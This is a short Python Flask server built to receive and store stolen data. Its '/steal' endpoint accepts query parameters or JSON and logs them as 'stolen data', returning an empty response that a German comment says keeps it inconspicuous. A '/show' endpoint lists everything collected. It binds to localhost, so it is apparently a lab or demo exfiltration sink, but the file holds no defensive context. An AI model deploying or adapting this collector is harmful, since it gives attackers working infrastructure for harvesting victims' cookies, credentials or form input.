from flask import Flask, request
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

stolen_data = []

@app.route('/steal', methods=['GET', 'POST'])
def steal():
    data = request.args if request.method == 'GET' else request.get_json()
    
    stolen_data.append(data)
    print(f"[+] New stolen data: {data}")
    
    return '', 204  # Kein Inhalt zurückgeben, um unauffällig zu bleiben

@app.route('/show', methods=['GET'])
def show():
    return {'stolen_data': stolen_data}

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5005, debug=True)



